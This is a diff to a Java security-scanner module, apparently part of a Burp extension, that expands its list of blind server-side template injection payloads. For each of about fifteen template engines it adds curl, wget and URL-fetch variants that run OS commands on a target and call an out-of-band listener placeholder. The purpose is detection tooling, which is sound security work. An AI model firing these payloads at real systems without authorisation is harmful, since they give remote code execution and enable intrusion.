@@ -210,59 +210,110 @@ public class SstiScanner implements ScanModule {
     );
 
     // OOB SSTI payloads for Collaborator-based blind detection
+    // Each template engine has DNS (nslookup) AND HTTP (curl/wget) variants.
+    // DNS variants work with Burp Collaborator; HTTP variants work with Custom OOB listener.
     private static final String[][] OOB_SSTI_PAYLOADS = {
-        // Jinja2 / Python
+        // Jinja2 / Python — DNS
         {"{{config.__class__.__init__.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (nslookup)"},
         {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subprocess)"},
         {"${__import__('os').popen('nslookup COLLAB_PLACEHOLDER').read()}", "Mako OOB (nslookup)"},
-        // Twig / PHP
+        // Jinja2 / Python — HTTP (Custom OOB compatible)
+        {"{{config.__class__.__init__.__globals__['os'].popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (curl)"},
+        {"{{config.__class__.__init__.__globals__['os'].popen('wget -q -O /dev/null http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (wget)"},
+        {"${__import__('os').popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}", "Mako OOB (curl)"},
+        {"{{config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://COLLAB_PLACEHOLDER/ssti')}}", "Jinja2 OOB (urllib)"},
+        // Twig / PHP — DNS
         {"{{['nslookup COLLAB_PLACEHOLDER']|filter('system')}}", "Twig OOB (system)"},
         {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system)"},
-        // Freemarker / Java
+        // Twig / PHP — HTTP (Custom OOB compatible)
+        {"{{['curl http://COLLAB_PLACEHOLDER/ssti']|filter('system')}}", "Twig OOB (curl)"},
+        {"{system('curl http://COLLAB_PLACEHOLDER/ssti')}", "Smarty OOB (curl)"},
+        {"{file_get_contents('http://COLLAB_PLACEHOLDER/ssti')}", "Smarty OOB (file_get_contents)"},
+        // Freemarker / Java — DNS
         {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nslookup COLLAB_PLACEHOLDER\")}", "Freemarker OOB (Execute)"},
         {"${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}", "Spring EL OOB"},
         {"__${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}__", "Thymeleaf OOB"},
-        // ERB / Ruby
+        // Freemarker / Java — HTTP (Custom OOB compatible)
+        {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"curl http://COLLAB_PLACEHOLDER/ssti\")}", "Freemarker OOB (curl)"},
+        {"${T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl http://COLLAB_PLACEHOLDER/ssti\"})}", "Spring EL OOB (curl)"},
+        {"__${T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl http://COLLAB_PLACEHOLDER/ssti\"})}__", "Thymeleaf OOB (curl)"},
+        {"${T(java.net.URL).new('http://COLLAB_PLACEHOLDER/ssti').openStream()}", "Spring EL OOB (URL)"},
+        // ERB / Ruby — DNS
         {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick)"},
         {"<%= system('nslookup COLLAB_PLACEHOLDER') %>", "ERB OOB (system)"},
-        // Pug / Node.js
+        // ERB / Ruby — HTTP (Custom OOB compatible)
+        {"<%= `curl http://COLLAB_PLACEHOLDER/ssti` %>", "ERB OOB (curl backtick)"},
+        {"<%= system('curl http://COLLAB_PLACEHOLDER/ssti') %>", "ERB OOB (curl system)"},
+        {"<%= require('net/http').get_response(URI('http://COLLAB_PLACEHOLDER/ssti')) %>", "ERB OOB (net/http)"},
+        // Pug / Node.js — DNS
         {"#{root.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')}", "Pug OOB"},
-        // Velocity / Java
+        // Pug / Node.js — HTTP (Custom OOB compatible)
+        {"#{root.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti')}", "Pug OOB (curl)"},
+        // Velocity / Java — DNS
         {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('nslookup COLLAB_PLACEHOLDER')", "Velocity OOB"},
-        // Smarty / PHP
+        // Velocity / Java — HTTP (Custom OOB compatible)
+        {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec(new String[]{\"/bin/sh\",\"-c\",\"curl http://COLLAB_PLACEHOLDER/ssti\"})", "Velocity OOB (curl)"},
+        // Smarty / PHP — DNS
         {"{if system('nslookup COLLAB_PLACEHOLDER')}{/if}", "Smarty OOB (if system)"},
-        // Nunjucks / Node.js
+        // Smarty / PHP — HTTP (Custom OOB compatible)
+        {"{if system('curl http://COLLAB_PLACEHOLDER/ssti')}{/if}", "Smarty OOB (if curl)"},
+        // Nunjucks / Node.js — DNS
         {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")()}}", "Nunjucks OOB"},
-        // Razor / .NET
+        // Nunjucks / Node.js — HTTP (Custom OOB compatible)
+        {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti')\")()}}", "Nunjucks OOB (curl)"},
+        // Razor / .NET — DNS
         {"@System.Diagnostics.Process.Start(\"nslookup\",\"COLLAB_PLACEHOLDER\")", "Razor OOB"},
-        // doT.js / Node.js
+        // Razor / .NET — HTTP (Custom OOB compatible)
+        {"@System.Diagnostics.Process.Start(\"curl\",\"http://COLLAB_PLACEHOLDER/ssti\")", "Razor OOB (curl)"},
+        {"@System.Diagnostics.Process.Start(\"powershell\",\"Invoke-WebRequest http://COLLAB_PLACEHOLDER/ssti\")", "Razor OOB (powershell)"},
+        // doT.js / Node.js — DNS
         {"{{= global.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') }}", "doT.js OOB"},
-        // Handlebars / Node.js
+        // doT.js / Node.js — HTTP (Custom OOB compatible)
+        {"{{= global.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') }}", "doT.js OOB (curl)"},
+        // Handlebars / Node.js — DNS
         {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")}}{{/with}}{{/with}}", "Handlebars OOB (constructor)"},
-        // EJS / Node.js
+        // Handlebars / Node.js — HTTP (Custom OOB compatible)
+        {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti')\")}}{{/with}}{{/with}}", "Handlebars OOB (curl)"},
+        // EJS / Node.js — DNS
         {"<%= process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (execSync)"},
         {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (require)"},
+        // EJS / Node.js — HTTP (Custom OOB compatible)
+        {"<%= process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') %>", "EJS OOB (curl execSync)"},
+        {"<%= require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') %>", "EJS OOB (curl require)"},
         // Django / Python (limited — Django templates are sandboxed, but custom template tags or debug mode may allow execution)
         {"{% load log %}{% get_admin_log 10 as entries %}{% for e in entries %}{{e}}{% endfor %}", "Django OOB (admin log exfil)"},
-        // Additional Jinja2 OOB variants
+        // Additional Jinja2 OOB variants — DNS
         {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subclass 287)"},
         {"{{lipsum.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (lipsum globals)"},
         {"{{cycler.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (cycler)"},
         {"{{joiner.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (joiner)"},
         {"{{namespace.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (namespace)"},
+        // Additional Jinja2 OOB variants — HTTP (Custom OOB compatible)
+        {"{{lipsum.__globals__['os'].popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (lipsum curl)"},
+        {"{{cycler.__init__.__globals__.os.popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (cycler curl)"},
         // Additional Smarty OOB variants
         {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system direct)"},
         {"{Smarty_Internal_Write_File::writeFile('/tmp/x','test',self::clearConfig())}", "Smarty OOB (file write)"},
-        // Additional Twig OOB variants
+        // Additional Twig OOB variants — DNS
         {"{{['nslookup COLLAB_PLACEHOLDER']|filter('exec')}}", "Twig OOB (exec filter)"},
+        // Additional Twig OOB variants — HTTP (Custom OOB compatible)
+        {"{{['curl http://COLLAB_PLACEHOLDER/ssti']|filter('exec')}}", "Twig OOB (curl exec)"},
         // Additional ERB OOB variants
         {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick alt)"},
-        // Groovy OOB
+        {"<%= `curl http://COLLAB_PLACEHOLDER/ssti` %>", "ERB OOB (curl backtick alt)"},
+        // Groovy OOB — DNS
         {"${\"nslookup COLLAB_PLACEHOLDER\".execute()}", "Groovy OOB (execute)"},
-        // Additional EJS OOB variants
+        // Groovy OOB — HTTP (Custom OOB compatible)
+        {"${\"curl http://COLLAB_PLACEHOLDER/ssti\".execute()}", "Groovy OOB (curl)"},
+        {"${new URL('http://COLLAB_PLACEHOLDER/ssti').text}", "Groovy OOB (URL)"},
+        // Additional EJS OOB variants — DNS
         {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString() %>", "EJS OOB (toString)"},
-        // Pug OOB variants
+        // Additional EJS OOB variants — HTTP (Custom OOB compatible)
+        {"<%= require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti').toString() %>", "EJS OOB (curl toString)"},
+        // Pug OOB variants — DNS
         {"#{require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()}", "Pug OOB (toString)"},
+        // Pug OOB variants — HTTP (Custom OOB compatible)
+        {"#{require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti').toString()}", "Pug OOB (curl toString)"},
     };
 
     @Override
